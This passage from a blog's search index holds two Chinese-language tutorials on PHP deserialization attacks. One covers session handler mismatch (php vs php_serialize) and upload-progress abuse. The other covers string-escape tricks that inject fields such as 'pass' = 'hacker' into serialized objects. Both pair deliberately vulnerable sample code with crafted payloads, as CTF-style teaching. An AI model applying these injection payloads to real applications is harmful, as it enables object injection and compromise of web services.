      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Session反序列化</title>
    <link href="/2023/08/23/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/08/23/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a>Session反序列化</h1><p>具体的什么是session,php session的工作机制是什么，可以参考下面这篇文章：<br><a href="https://xz.aliyun.com/t/6640">https://xz.aliyun.com/t/6640</a></p><p>先来介绍一下session。session是储存在服务器端的数据，相对比cookie来讲更加的安全，因为cookie是储存在客户端的数据。</p><p>​                                              先来看一下几个参数的含义:</p><table><thead><tr><th>Directive</th><th></th></tr></thead><tbody><tr><td>session.save_handler</td><td>session保存形式，默认为files</td></tr><tr><td>session.save_path</td><td>session保存路径</td></tr><tr><td>session.serialize_handler</td><td>session序列化存储所用处理器，默认为php</td></tr><tr><td>session.upload_progress.cleanup</td><td>一旦读取了所有的POST数据，立即清除进度信息。默认开启</td></tr><tr><td>session.upload_progress.enabled</td><td>将上传文件的进度信息存在session中，默认开启</td></tr></tbody></table><p>session反序列漏洞产生的原因就是写入和读取的内容不一样  (就是使用了不同的处理器)</p><p>在php中session有三种反序列化的机制，分别是</p><p><strong>1.php 2.php_serialize 3.php_binary</strong></p><p>它们的序列化的结果是不一样的，下面分别介绍一下。</p><p>1.php ——&gt;键名＋竖线＋经过serialize()函数序列化之后的值</p><p>2.php_serialize ——&gt; 经过serialize()函数序列化处理的数组   使用这个php版本需要大于5.5.4</p><p>3.php_binary ——&gt;  键名长度对应的ASCII码＋键名＋经过serialize()函数序列化后的值  </p><p>比如说：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[name]=<span class="hljs-string">&#x27;jj&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>1.php  ——&gt;name|s:2:”jj”;</p><p>2.php_serialzie ——&gt;a:1:{s:4:”name”;s:2:”jj”;}</p><p>3.php_binary ——&gt; EOTnames:2:”jj”;</p><p>下面举一个简单的例子来说明一下session反序列化的应用</p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*hint.php*/</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;her=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;name===<span class="hljs-variable language_">$this</span>-&gt;her)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里面hint.php代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在index.php中 没有可以输入的点，但是有一个session_start(),可以对session进行一个读取</p><p>然后在hint.php中是一个写入session的，这里写入使用了php_serialize 读取使用了php</p><p>根据它们对session序列化的不同，可以构造恶意的代码，从而去获得flag</p><p>既然读取是php，它会将|后面的内容进行一个反序列化，所以我们可以在序列化好的字符串前面加上一个|</p><p>那么来看这个简单的Flag类，这里利用了引用，就是在某些情况下，两个值不同但获取flag的前提是两个值相同</p><p>所以可以构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;name=&amp;<span class="hljs-variable">$a</span>-&gt;her;<br><span class="hljs-keyword">echo</span>  <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="没有-SESSION变量赋值的情况"><a href="#没有-SESSION变量赋值的情况" class="headerlink" title="没有$_SESSION变量赋值的情况"></a>没有$_SESSION变量赋值的情况</h1><p>当session.upload_progress.enable 开启时，当上传一个文件时，会对文件上传进度进行一个监测。</p><p>官方来讲就是：当 <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled">session.upload_progress.enabled</a> INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。</p><p>当一个上传在处理中，同时POST一个与INI中设置的<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>同名变量时，上传进度可以在<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中获得。 当PHP检测到这种POST请求时，它会在<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中添加一组数据, 索引是<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a> 与 <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>连接在一起的值。</p><p>简单的来讲就是构造一个上传表单，然后抓包，对文件名进行一个修改</p><p>表单代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;form action=<span class="hljs-string">&quot;http://example&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>; <span class="hljs-meta">?&gt;</span><span class="hljs-string">&quot; value=&quot;</span><span class="hljs-number">123</span><span class="hljs-string">&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;</span>file<span class="hljs-string">&quot; name=&quot;</span>file<span class="hljs-string">&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;</span>submit<span class="hljs-string">&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br></code></pre></td></tr></table></figure><p>可以看看这篇文章：</p><p><a href="https://www.cnblogs.com/yokan/p/12575371.html">https://www.cnblogs.com/yokan/p/12575371.html</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化逃逸</title>
    <link href="/2023/08/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/"/>
    <url>/2023/08/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<p>之前就对字符串逃逸这一块理解的不是很深刻，下面通过一位师傅的博客来进一步深入理解一下有关php字符串逃逸的相关内容。</p><p>贴上师傅的博客地址:<a href="https://blog.csdn.net/qq_45521281/article/details/107135706">https://blog.csdn.net/qq_45521281/article/details/107135706</a></p><p><strong>先来说一下什么是字符串逃逸，就是我们可以构造一些恶意代码，让其在反序列化的时候执行我们想让它执行的。在这过程中造成的字符串的增加或者减少称为字符串逃逸。</strong></p><h1 id="替换修改后导致字符串长度增加-逃逸增加"><a href="#替换修改后导致字符串长度增加-逃逸增加" class="headerlink" title="替换修改后导致字符串长度增加   (逃逸增加)"></a>替换修改后导致字符串长度增加   (逃逸增加)</h1><p>先来一个代码简单的分析一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;<br><span class="hljs-meta">?&gt;</span><br>    看它的返回结果：<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;<br><span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>若我们在不直接修改pass的前提下，让pass的值变成hacker，我们该如何实现呢？<br>这里我们就用到了字符串逃逸增加来实现。</p><p>我们可以看到str_replace(‘bb’,’ccc’,$str); 意思就是在变量str中，将每两个b替换成三个c，但序列化之后的字符长度仍然按照没有被替换的。</p><p>举个例子说明一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaabb&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br><span class="hljs-meta">?&gt;</span><br>    运行的结果如下：<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;aaaabb&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;aaaaccc&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;  <span class="hljs-comment">//这里我们可以看到aaaaccc明明是7个字符，但前面标的仍然是6个，这里就逃逸出来一个字符。</span><br></code></pre></td></tr></table></figure><p>根据上面的演示，我们可以进行构造代码，通过bb替换成ccc，来进行字符串的逃逸，从而让pass的值为hacker</p><p>下面是代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;<br><span class="hljs-comment">//echo $res;</span><br><span class="hljs-meta">?&gt;</span><br>    运行的结果：<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">81</span>:<span class="hljs-string">&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;<span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">hacker</span><br><span class="hljs-string">成功的实现目标。</span><br></code></pre></td></tr></table></figure><p>思想就是我们要逃逸出来的字符串是”;s:4:”pass”;s:6:”hacker”;} 总共27个字符串，也就是说需要逃逸27个字符串出来，之前是2b逃逸出来一个，那么这需要逃逸27个，也就需要54b。</p><h1 id="替换修改后导致字符串长度减少-（逃逸减少）"><a href="#替换修改后导致字符串长度减少-（逃逸减少）" class="headerlink" title="替换修改后导致字符串长度减少  （逃逸减少）"></a>替换修改后导致字符串长度减少  （逃逸减少）</h1><p>字符串逃逸减少就是字符串经过一些变化后，字符长度减少，原来的功能性代码变成普通的字符串，然后我们可以利用逃逸进行构造一些恶意的代码。</p><p>下面来一个例子看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str_rep</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/php|test/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;name&#x27;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;sign&#x27;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sign&#x27;</span>];<br><span class="hljs-variable">$test</span>[<span class="hljs-string">&#x27;number&#x27;</span>]=<span class="hljs-string">&#x27;2020&#x27;</span>;<br><span class="hljs-variable">$temp</span>=<span class="hljs-title function_ invoke__">str_rep</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-variable">$temp</span>);<br><span class="hljs-variable">$fake</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$temp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;name:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;sign:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;sign&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;number:&quot;</span>.<span class="hljs-variable">$fake</span>[<span class="hljs-string">&#x27;number&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码都是上面师傅里面演示的，这里我是根据自己的理解来讲一下。</p><p>把这段代码放在本地，可以看到结果为：</p><p><img src="https://s2.loli.net/2023/08/18/Y2h8jRxIf5QKi3y.png" alt="image-20230523212438734.png"></p><p>这里可以看到name和sign里面都是没有内容的，所以这里是N。</p><p>然后我们看到代码中的str_rep()函数，是将变量string中的php和test替换成空。</p><p>然后下面有一个经过这段函数的反序列化，这里就构成了反序列化逃逸减少的漏洞。</p><p>反序列化逃逸减少不同于增加。</p><p>增加是看要构造的恶意代码字符串长度是多少，就举一个例子，如果匹配到了bb,函数是把它替换成ccc，那么就相当于每一个bb可以逃逸出1个字符，如果我们要构造的恶意代码长度是27位，那么我们就需要54个bb。</p><p>而减少我个人感觉是比增加复杂一点，但也不多。拿上面的代码进行演示，如果我想让sign的值是eval，并且数字改成2023，那么这就利用到了字符串逃逸减少。</p><p>首先构造我们要实现的目标。”;s:4:”sign”;s:4:”eval”;s:6:”number”;s:4:”2023”;}  </p><p>减少逃逸是让一些功能性代码变成字符串，这里是让sign变成字符串，而后面构造的sign和number则成为新的功能性代码。</p><p>“;s:4:”sign”;s:xx:”前面的字符一共有19个，我们有两种方法，一种是利用php，另外一种是利用test只不过都需要填充字符罢了   “;s:4:”sign”;s:4:”eval”;s:6:”number”;s:4:”2023”;} </p><p>“;s:4:”sign”;s:xx:”这里是需要填充的字符”;s:4:”sign”;s:4:”eval”;s:6:”number”;s:4:”2023”;} </p><p>如果用7个php，也就是可以逃逸21个，上面是19个，那么我们可以填充2个字符。</p><p>如果用5个test,逃逸20个，需要填充一个字符。</p><p><img src="https://s2.loli.net/2023/08/18/Y2h8jRxIf5QKi3y.png" alt="image-20230523212438734.png"></p><p><img src="https://s2.loli.net/2023/08/18/NeRMEVlk6cOAqYr.png" alt="image-20230523220226399.png">结果如上。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
